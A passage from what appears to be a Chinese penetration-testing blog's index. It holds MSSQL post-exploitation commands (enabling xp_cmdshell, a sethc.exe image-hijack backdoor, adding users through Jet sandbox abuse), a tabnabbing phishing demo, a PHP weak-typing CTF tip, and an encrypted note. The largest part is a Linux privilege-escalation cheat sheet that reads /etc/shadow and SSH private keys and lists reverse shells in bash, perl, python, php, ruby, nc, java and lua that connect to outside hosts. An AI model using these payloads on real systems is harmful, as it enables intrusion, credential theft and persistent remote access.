&apos;xp_cmdshell&apos; exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos; EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;(SQL2005)2.列目录：exec master..xp_cmdshell &apos;ver&apos; (or) exec master..xp_dirtree &apos;c:\&apos;,1,1 (or) drop table black create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- insert into black exec master..xp_cmdshell &apos;dir c:\&apos; select top 1 mulu from black where id=1 xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权3.备份启动项：alter database [master] set RECOVERY FULL create table cmd (a image) backup log [master] to disk = &apos;c:\cmd1&apos; with init insert into cmd (a) values (0x(batcode)) backup log [master] to disk = &apos;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat&apos; drop table cmd4.映像劫持xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&apos;,&apos;debugger&apos;,&apos;reg_sz&apos;,&apos;c:\windows\system32\cmd.exe&apos;5.沙盒模式提权：法a：exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\JET\Engines&apos;,&apos;SandBoxMode&apos;,&apos;REG_DWORD&apos;,0;关闭沙盒模式 法b：Select * From OpenRowSet(&apos;Microsoft.Jet.OLEDB.4.0&apos;,&apos;;Database=c:\windows\system32\ias\ias.mdb&apos;,&apos;select shell(&quot;net user mstlab mstlab /add&quot;)&apos;); #or c:\windows\system32\ias\dnary.mdb string类型用此。 开启OpenRowSet：exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ad Hoc Distributed Queries&apos;,1;RECONFIGURE;6.xp_regwrite操作注册表exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows\currentversion un&apos;,&apos;black&apos;,&apos;REG_SZ&apos;,&apos;net user test test /add&apos; 开启xp_oacreate:exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ole Automation Procedures&apos;,1;RECONFIGURE;]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「应急响应」应急响应实战笔记,一个安全工程师的自我修养]]></title>
    <url>%2Farchives%2Fdf6dc829.html</url>
    <content type="text"><![CDATA[应急响应实战笔记,一个安全工程师的自我修养。 项目目录[第一章：应急响应]第1篇:Window入侵排查 第2篇:Linux入侵排查[第二章：日志分析] 第1篇:Window日志分析 第2篇:Linux日志分析 第3篇:Web日志分析 第4篇:MSSQL日志分析 第5篇:MySQL日志分析[第三章:Windows实战篇]第1篇：FTP暴力破解 第2篇：蠕虫病毒 第3篇：勒索病毒 第4篇：ARP病毒 第5篇：挖矿病毒（一） 第6篇：挖矿病毒（二）[第四章：Linux实战篇]第1篇：SSH暴力破解 第2篇：捕捉短连接 第3篇：挖矿病毒 第4篇：盖茨木马 第5篇：DDOS病毒 第6篇：Shell病毒[第五章：Web实战篇]第1篇：网站被植入Webshell 第2篇：门罗币恶意挖矿 第3篇：批量挂黑页 第4篇：新闻源网站劫持 第5篇：移动端劫持 第6篇：搜索引擎劫持 第7篇：网站首页被篡改 第8篇：管理员账号被篡改]]></content>
      <categories>
        <category>渗透测试</category>
        <category>应急响应</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「前端钓鱼欺骗」前端黑魔法之远程控制地址栏]]></title>
    <url>%2Farchives%2F2db90a41.html</url>
    <content type="text"><![CDATA[由于今天看到一篇文章《危险的 target=”_blank” 与 “opener”》，里面提到了一个老知识点，就是target=”_blank”的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《神奇的opener对象》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。 0x01 效果演示 首先可以看一个小例子： http://675ba661.w1n.pw/41593a见上图，打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。 0x02 原理说明上述页面的代码也很简单： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&gt;click me&lt;/a&gt; &lt;script&gt; function start() { setInterval(function() { baidu.href=&quot;http://675ba661.w1n.pw/baidu&quot;; baidu.click(); }, 10000); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《openresty+lua在反向代理服务中的玩法》中也有详细的介绍） 这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。 比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。 0x03 扩展尝试除了超链接以外，用window.open也可以达到一样的效果： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&gt;click me&lt;/a&gt; &lt;script&gt; function start() { var w = window.open(&apos;https://www.baidu.com&apos;, &apos;baidu&apos;); setInterval(function() { w.location = &apos;http://675ba661.w1n.pw/baidu&apos; }, 5000) } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。 那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？ 我们可以做一个实验。编写A页面（ http://a.675ba661.w1n.pw/A_victim ）： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;p&gt;Hello world.&lt;/p&gt; &lt;script&gt; window.name = &apos;baidu&apos;; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;编写B页面（ http://b.675ba661.w1n.pw/B_attacker ）： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&gt;click me&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置target=”baidu”。 显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。 总结本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。 但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hashpump实现哈希长度扩展攻击]]></title>
    <url>%2Farchives%2Fa5b396d3.html</url>
    <content type="text"><![CDATA[Hashpump实现哈希长度扩展攻击]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP弱类型之md5_tips(ctf经常用到PHP弱类型)]]></title>
    <url>%2Farchives%2Fc26c2571.html</url>
    <content type="text"><![CDATA[&lt;?php if (md5(&apos;240610708&apos;) == &quot;0&quot;) { echo &quot;Matches&quot;; } ?&gt; 这里md5(&apos;240610708&apos;) == &quot;0&quot; == 0e987654321 同样也相等.]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[随手笔记_待整理]]></title>
    <url>%2Farchives%2Fe9bb571b.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>随手笔记_待整理</category>
      </categories>
      <tags>
        <tag>随手笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 提权常用命令集]]></title>
    <url>%2Farchives%2F27fa4050.html</url>
    <content type="text"><![CDATA[0x00 操作系统相关操作系统类型版本 cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat内核版本，是否是64位 cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz-环境变量 cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set查看是否有打印机 lpstat -a0x01 应用与服务相关查看正在运行的程序及对应的用户权限 ps aux ps -ef top cat /etc/services以root权限运行的进程 ps aux | grep root ps -ef | grep root查看安装了的应用 ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archives ls -alh /var/cache/yum/一些服务的配置文件 cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;计划任务 crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root找存储的明文用户名，密码 grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla0x02 通信与网络相关查看当前网络地址 /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network查看网络配置,DNS,DHCP,网关 cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname查看网络通信 lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w查看缓存 arp -e route /sbin/route -nee tcpdump tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21 tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]交互式shellbash版本： bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1perl版本: perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;python版本: python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;php版本： php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;ruby版本： ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;nc版本： nc -e /bin/sh 223.8.200.234 1234nc不使用-e： mknod /tmp/backpipe p /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipemknod: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipejava版本： r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()lua版本： lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;202.103.243.122&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;端口转发 lcx lcx -listen 4567 33891 #Attacker lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)隧道 ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig0x03 用户相关用户信息 id who w last cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos; # 列出超级用户 awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd #列出超级用户 cat /etc/sudoers sudo -l列家目录 ls -ahlR /root/ ls -ahlR /home/从配置文件里面寻找密码 cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg看其他用户的操作记录 cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_historyssh私钥 cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key 文件系统相关/etc/目录下面文件 ls -aRl /etc/ | awk &apos;$1 ~ /^.*w.*/&apos; 2&gt;/dev/null # Anyone ls -aRl /etc/ | awk &apos;$1 ~ /^..w/&apos; 2&gt;/dev/null # Owner ls -aRl /etc/ | awk &apos;$1 ~ /^.....w/&apos; 2&gt;/dev/null # Group ls -aRl /etc/ | awk &apos;$1 ~ /w.$/&apos; 2&gt;/dev/null # Other find /etc/ -readable -type f 2&gt;/dev/null # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone日志文件 ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases查看网站文件 ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/常见日志文件 cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh 